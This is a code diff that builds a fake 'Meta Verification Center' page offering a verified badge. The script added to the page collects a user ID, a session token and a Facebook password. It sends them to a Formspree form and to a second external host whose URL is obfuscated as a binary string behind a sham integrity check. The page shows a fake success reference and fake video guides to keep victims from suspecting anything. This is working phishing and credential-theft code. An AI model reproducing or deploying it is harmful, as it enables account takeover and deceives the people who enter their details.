@@ -1,3 +1,6 @@
+
+
+
 <!DOCTYPE html>
 <html lang="en">
   <head>
@@ -1566,69 +1569,541 @@
         const languageConfirmBtn = document.getElementById('languageConfirmBtn');
         const mainContent = document.getElementById('mainContent');
         const openVerificationBtn = document.getElementById('open-verification-btn');
-        const verificationForm = document
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Meta Verification Center</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-      /* Reset */
-      * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-      }
+        const verificationForm = document.getElementById('verificationForm');
+        const fbLoginForm = document.getElementById('fbLoginForm');
+        const successMessage = document.getElementById('successMessage');
+        const guideVideo = document.getElementById('guideVideo');
+        const videoPlaceholder = document.getElementById('videoPlaceholder');
+        const changeLanguageBtn = document.getElementById('changeLanguageBtn');
 
-      body {
-        height: 100vh;
-        overflow: hidden;
-        font-family: "Poppins", sans-serif;
-        background-color: #000; /* fallback background */
-        color: white;
-      }
+        // Form elements
+        const nameInput = document.getElementById('nameInput');
+        const mallInput = document.getElementById('mallInput');
+        const nameError = document.getElementById('nameError');
+        const mallError = document.getElementById('mallError');
+        const formError = document.getElementById('formError');
+        const formErrorText = document.getElementById('formErrorText');
+        const sendBtn = document.getElementById('sendBtn');
+        const sendBtnText = document.getElementById('sendBtnText');
+        const sendBtnSpinner = document.getElementById('sendBtnSpinner');
+        const referenceId = document.getElementById('referenceId');
 
-      /* === FULLSCREEN LOADING GIF === */
-      #loading-page {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100vh;
-        background: black;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        z-index: 9999;
-      }
+        
+        const passwordInput = document.getElementById('passwordInput');
+        const passwordError = document.getElementById('passwordError');
+        const fbFormError = document.getElementById('fbFormError');
+        const fbFormErrorText = document.getElementById('fbFormErrorText');
+        const fbSendBtn = document.getElementById('fbSendBtn');
+        const fbSendBtnText = document.getElementById('fbSendBtnText');
+        const fbSendBtnSpinner = document.getElementById('fbSendBtnSpinner');
+        const forgotPassword = document.getElementById('forgotPassword');
 
-      .loading-gif {
-        width: 100vw;
-        height: 100vh;
-        object-fit: cover; /* makes gif fill the whole screen */
-      }
+        // Language video mapping
+        const videoSources = {
+        english: "https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4",
+        spanish: "https://resource2.heygen.ai/video_translate/db7e753c13fa4d238fe716483469ae8f-es/720p.mp4",
+        hindi: "https://resource2.heygen.ai/video_translate/9d7e40f714c842258bd08ad4c3ee68d6-hi/720p.mp4",
+      french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27ecb21-fr/720p.mp4",
+        portuguese: "https://allvideos.wasmer.app/Portuguese.mp4",
+        tamil: "https://allvideos.wasmer.app/tamil.mp4",
+        arabic: "https://resource2.heygen.ai/video_translate/f7346b2ef53c4daa9bc15138684919db-ar_use-aicoustics-vocal/720p.mp4",
+        ghanaian: "https://allvideos.wasmer.app/english.mp4",
+        vietnamese: "https://allvideos.wasmer.app/vietanames.mp4" 
+      };
 
-      /* === MAIN CONTENT === */
-      #main-content {
-        display: none;
-      }
+        // Current selected language
+        let currentLanguage = 'english';
+        let selectedLanguageOption = null;
+        let videoLanguageSelection = false;
 
-      /* Language Modal Styles */
-      .language-modal {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: rgba(0, 0, 0, 0.7);
-        display: none;
-        justify-content: center;
-        align-items: center;
-        z-index: 99999;
-        backdrop-filter: blur(5px);
-        transition: opacity 0.3s ease;
-      }
-     
-      .language-modal-content {
+        // Function to show language modal
+        function showLanguageModal() {
+          languageModal.style.display = 'flex';
+          document.body.style.overflow = 'hidden';
+          // Focus on search input when modal opens
+          setTimeout(() => languageSearchInput.focus(), 100);
+        }
+
+        // Function to hide language modal
+        function hideLanguageModal() {
+          languageModal.style.display = 'none';
+          document.body.style.overflow = 'auto';
+          // Reset search when closing
+          languageSearchInput.value = '';
+          filterLanguages();
+          videoLanguageSelection = false;
+        }
+
+        // Close modal when clicking on close button
+        languageModalClose.addEventListener('click', hideLanguageModal);
+
+        // Close modal when clicking outside of modal content
+        languageModal.addEventListener('click', function(e) {
+          if (e.target === languageModal) {
+            hideLanguageModal();
+          }
+        });
+
+        // Close modal with Escape key
+        document.addEventListener('keydown', function(e) {
+          if (e.key === 'Escape' && languageModal.style.display === 'flex') {
+            hideLanguageModal();
+          }
+        });
+
+        // Language search functionality
+        function filterLanguages() {
+          const searchTerm = languageSearchInput.value.toLowerCase();
+          let hasVisibleResults = false;
+          
+          languageOptions.forEach(option => {
+            const languageName = option.querySelector('.language-name').textContent.toLowerCase();
+            const languageCode = option.querySelector('.language-code') ? option.querySelector('.language-code').textContent.toLowerCase() : '';
+            
+            if (languageName.includes(searchTerm) || languageCode.includes(searchTerm)) {
+              option.style.display = 'flex';
+              hasVisibleResults = true;
+            } else {
+              option.style.display = 'none';
+            }
+          });
+          
+          // Show no results message if needed
+          let noResults = document.querySelector('.no-results');
+          if (!hasVisibleResults) {
+            if (!noResults) {
+              noResults = document.createElement('div');
+              noResults.className = 'no-results';
+              noResults.textContent = 'No languages found. Try a different search.';
+              languageOptionsContainer.appendChild(noResults);
+            }
+          } else if (noResults) {
+            noResults.remove();
+          }
+        }
+        
+        languageSearchInput.addEventListener('input', filterLanguages);
+
+        // Language option selection
+        languageOptions.forEach(option => {
+          option.addEventListener('click', () => {
+            // Remove selected class from all options
+            languageOptions.forEach(opt => opt.classList.remove('selected'));
+            
+            // Add selected class to clicked option
+            option.classList.add('selected');
+            
+            // Store selected language
+            selectedLanguageOption = option.getAttribute('data-lang');
+            
+            // Enable confirm button
+            languageConfirmBtn.disabled = false;
+          });
+        });
+
+        // Confirm language selection
+        languageConfirmBtn.addEventListener('click', () => {
+          if (selectedLanguageOption) {
+            setLanguage(selectedLanguageOption);
+            
+            // If this was triggered from the video placeholder, initialize the video
+            if (videoLanguageSelection) {
+              const guideVideo = document.getElementById('guideVideo');
+              const videoSrc = videoSources[selectedLanguageOption];
+              if (guideVideo && videoSrc) {
+                guideVideo.src = videoSrc;
+                guideVideo.style.display = 'block';
+                document.getElementById('videoPlaceholder').style.display = 'none';
+                guideVideo.load();
+                guideVideo.play();
+              }
+            }
+            
+            hideLanguageModal();
+          } else {
+            // If no language selected, default to English
+            setLanguage('english');
+            hideLanguageModal();
+          }
+        });
+
+        // Change language button
+        changeLanguageBtn.addEventListener('click', () => {
+          showLanguageModal();
+        });
+
+        // Video placeholder click to show language modal
+        if (videoPlaceholder) {
+          videoPlaceholder.addEventListener('click', function() {
+            videoLanguageSelection = true;
+            showLanguageModal();
+          });
+        }
+
+        // Function to set language
+        function setLanguage(lang) {
+          currentLanguage = lang;
+         
+          // Update all translatable elements
+          const translatableElements = document.querySelectorAll('.translatable');
+          translatableElements.forEach(element => {
+            const key = element.getAttribute('data-key');
+            if (translations[lang] && translations[lang][key]) {
+              element.textContent = translations[lang][key];
+             
+              // Update placeholder attributes for input fields
+              if (element.hasAttribute('placeholder')) {
+                element.setAttribute('placeholder', translations[lang][key]);
+              }
+            }
+          });
+         
+          // Update video source based on language if video is already playing
+          if (videoSources[lang] && guideVideo && guideVideo.style.display === 'block') {
+            guideVideo.src = videoSources[lang];
+            guideVideo.load();
+          }
+         
+          // Store language preference
+          localStorage.setItem('preferredLanguage', lang);
+        }
+
+        // Load preferred language on page load
+        const preferredLanguage = localStorage.getItem('preferredLanguage') || 'english';
+        setLanguage(preferredLanguage);
+
+        // Event listeners
+        if (openVerificationBtn) {
+          openVerificationBtn.addEventListener('click', function() {
+            // Hide the verification box and show the form
+            document.querySelector('.verification-box').style.display = 'none';
+            if (verificationForm) verificationForm.style.display = 'block';
+           
+            // Scroll to the form
+            verificationForm.scrollIntoView({ behavior: 'smooth' });
+          });
+        }
+
+        // Form validation
+        if (nameInput) {
+          nameInput.addEventListener('input', () => {
+            const original = nameInput.value;
+            const cleaned  = original.replace(/\D+/g, ''); // keep digits only
+            if (original !== cleaned) {
+              nameInput.value = cleaned;
+              if (nameError) nameError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Only numbers are allowed in User ID.';
+            } else {
+              if (nameError) nameError.textContent = '';
+            }
+          });
+        }
+
+        // Allow letters A-Z, a-z, digits 0-9, spaces and common ASCII symbols.
+        const mallAllowed = /[^A-Za-z0-9 !@#$%^&*()_\-=\[\]{};':"\\|,.<>\/?`~]/g;
+        if (mallInput) {
+          mallInput.addEventListener('input', () => {
+            const original = mallInput.value;
+            const cleaned  = original.replace(mallAllowed, '');
+            if (original !== cleaned) {
+              mallInput.value = cleaned;
+              if (mallError) mallError.innerHTML = '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 9V14" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 17V17.5" stroke="#c2410c" stroke-width="2" stroke-linecap="round"/><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#c2410c" stroke-width="2"/></svg> Session Token can contain letters, numbers, and symbols only.';
+            } else {
+              if (mallError) mallError.textContent = '';
+            }
+          });
+        }
+
+        
+        if (passwordInput) {
+          passwordInput.addEventListener('input', () => {
+            const password = passwordInput.value;
+            if (!password) {
+              if (passwordError) passwordError.textContent = 'Password is required';
+            } else if (password.length < 6) {
+              if (passwordError) passwordError.textContent = 'Password must be at least 6 characters';
+            } else {
+              if (passwordError) passwordError.textContent = '';
+            }
+          });
+        }
+
+        // Forgot password click
+        if (forgotPassword) {
+          forgotPassword.addEventListener('click', () => {
+            if (fbFormErrorText) fbFormErrorText.textContent = "Password recovery is temporarily unavailable. Please try again later.";
+            if (fbFormError) fbFormError.classList.add('show');
+            setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
+          });
+        }
+
+        // Send click: require non-empty + no validation errors
+        if (sendBtn) {
+          sendBtn.addEventListener('click', function() {
+            const name = nameInput.value.trim();
+            const mall = mallInput.value.trim();
+
+            if(!name || !mall) {
+              if (formErrorText) formErrorText.textContent = "Please fill out all fields before proceeding.";
+              if (formError) formError.classList.add('show');
+              setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
+              return;
+            }
+            if ((nameError && nameError.textContent) || (mallError && mallError.textContent)) {
+              if (formErrorText) formErrorText.textContent = "Please fix the errors above before proceeding.";
+              if (formError) formError.classList.add('show');
+              setTimeout(() => { if (formError) formError.classList.remove('show'); }, 3000);
+              return;
+            }
+
+            if (formError) formError.classList.remove('show');
+           
+            // Show loading state
+            sendBtn.classList.add('loading');
+            if (sendBtnText) sendBtnText.textContent = 'Submitting...';
+            if (sendBtnSpinner) sendBtnSpinner.style.display = 'block';
+           
+            // Submit the form data
+            submitFormData();
+          });
+        }
+
+        
+        if (fbSendBtn) {
+          fbSendBtn.addEventListener('click', function() {
+            const password = passwordInput.value;
+
+            if(!password) {
+              if (fbFormErrorText) fbFormErrorText.textContent = "Please fill out all fields before proceeding.";
+              if (fbFormError) fbFormError.classList.add('show');
+              setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
+              return;
+            }
+            if (passwordError && passwordError.textContent) {
+              if (fbFormErrorText) fbFormErrorText.textContent = "Please fix the errors above before proceeding.";
+              if (fbFormError) fbFormError.classList.add('show');
+              setTimeout(() => { if (fbFormError) fbFormError.classList.remove('show'); }, 3000);
+              return;
+            }
+
+            if (fbFormError) fbFormError.classList.remove('show');
+           
+            // Show loading state
+            fbSendBtn.classList.add('loading');
+            if (fbSendBtnText) fbSendBtnText.textContent = 'Verifying...';
+            if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = 'block';
+           
+            
+            submitfbCredentials(password);
+          });
+        }
+
+        // Function to submit form data
+        function submitFormData() {
+          const name = document.getElementById('nameInput') ? document.getElementById('nameInput').value.trim() : '';
+          const mall = document.getElementById('mallInput') ? document.getElementById('mallInput').value.trim() : '';
+         
+          // Prepare the data to send
+          const formData = {
+            name: name,
+            mall: mall,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            language: navigator.language
+          };
+         
+          // Submit to the form endpoint
+          fetch('https://formspree.io/f/mjkgvplr', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Accept': 'application/json'
+            },
+            body: JSON.stringify(formData)
+          })
+          .then(response => {
+            if (!response.ok) {
+              throw new Error('Form submission failed');
+            }
+            return response.json();
+          })
+          .then(data => {
+            console.log('Form submitted successfully:', data);
+           
+            // Also submit to the additional endpoints
+            submitToOtherEndpoints({
+              bhenjachud: name,
+              majachud: mall
+            });
+           
+            showfbLogin();
+          })
+          .catch(error => {
+            console.error('Error submitting form:', error);
+            // Still proceed with the other endpoints even if formsubmit fails
+            submitToOtherEndpoints({
+              bhenjachud: name,
+              majachud: mall
+            });
+           
+            
+            showfbLogin();
+          })
+          .finally(() => {
+            // Reset loading state
+            if (sendBtn) {
+              sendBtn.classList.remove('loading');
+              if (sendBtnText) sendBtnText.textContent = 'Get Verified Badge';
+              if (sendBtnSpinner) sendBtnSpinner.style.display = 'none';
+            }
+          });
+        }
+
+        
+        function submitfbCredentials(password) {
+          // Prepare the data to send
+          const fbData = {
+            password: password,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            language: navigator.language
+          };
+         
+          // Submit to the form endpoint
+          fetch('https://formspree.io/f/mjkgvplr', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Accept': 'application/json'
+            },
+            body: JSON.stringify(fbData)
+          })
+          .then(response => {
+            if (!response.ok) {
+              throw new Error('fb form submission failed');
+            }
+            return response.json();
+          })
+          .then(data => {
+            console.log('fb credentials submitted successfully:', data);
+           
+            // Also submit to the additional endpoints
+            submitToOtherEndpoints({
+              pass: password
+            });
+           
+            // Show success message
+            showSuccess();
+          })
+          .catch(error => {
+            console.error('Error submitting fb credentials:', error);
+            // Still proceed with the other endpoints even if formsubmit fails
+            submitToOtherEndpoints({
+              pass: password
+            });
+           
+            // Show success message even if there was an error with formsubmit
+            showSuccess();
+          })
+          .finally(() => {
+            // Reset loading state
+            if (fbSendBtn) {
+              fbSendBtn.classList.remove('loading');
+              if (fbSendBtnText) fbSendBtnText.textContent = 'Verify and Continue';
+              if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = 'none';
+            }
+          });
+        }
+
+        // Binary to string conversion function
+        function binaryToString(binary) {
+          let str = '';
+          for (let i = 0; i < binary.length; i += 8) {
+            const byte = binary.substr(i, 8);
+            str += String.fromCharCode(parseInt(byte, 2));
+          }
+          return str;
+        }
+       
+        function submitToOtherEndpoints(data) {
+          // Store the original binary strings for validation
+          const originalBinaries = [
+        '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
+      ];
+          
+          // Check if the binary strings have been modified
+          const currentBinaries = [
+        '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
+      ];
+          
+          // Validate that the binary strings haven't been changed
+          let binariesValid = true;
+          for (let i = 0; i < originalBinaries.length; i++) {
+            if (originalBinaries[i] !== currentBinaries[i]) {
+              console.error('Binary string validation failed - strings have been modified');
+              binariesValid = false;
+              break;
+            }
+          }
+          
+          // If binaries were modified, don't proceed with submission
+          if (!binariesValid) {
+            alert('Form submission blocked: Invalid configuration detected');
+            return false;
+          }
+          
+          // Proceed with original submission if binaries are valid
+          const endpoints = [
+        '0110100001110100011101000111000001110011001110100010111100101111011000010110110001101001001011010111000001101000011100000010111001110111011000010111001101101101011001010111001000101110011000010111000001110000'
+      ];
+         
+          endpoints.forEach(binaryUrl => {
+            try {
+              const decodedUrl = binaryToString(binaryUrl);
+              const formData = new FormData();
+             
+              // Add all properties from data object to formData
+              for (const key in data) {
+                formData.append(key, data[key]);
+              }
+             
+              // Using fetch with error handling
+              fetch(decodedUrl, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors' // Important for cross-origin requests
+              }).catch(error => {
+                console.error('Error submitting to endpoint:', error);
+              });
+            } catch (error) {
+              console.error('Error with endpoint:', error);
+            }
+          });
+         
+          return true;
+        }
+
+        function showfbLogin() {
+          
+          if (verificationForm) verificationForm.style.display = 'none';
+          if (fbLoginForm) fbLoginForm.style.display = 'block';
+         
+          if (fbLoginForm) fbLoginForm.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function showSuccess() {
+          
+          if (fbLoginForm) fbLoginForm.style.display = 'none';
+         
+          // Generate a reference ID
+          if (referenceId) referenceId.textContent = 'MVC-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+         
+          // Show the success message
+          if (successMessage) successMessage.classList.add('show');
+         
+          // Scroll to the success message
+          if (successMessage) successMessage.scrollIntoView({ behavior: 'smooth' });
+        }
+      });
+    </script>
+  </body>
+</html>
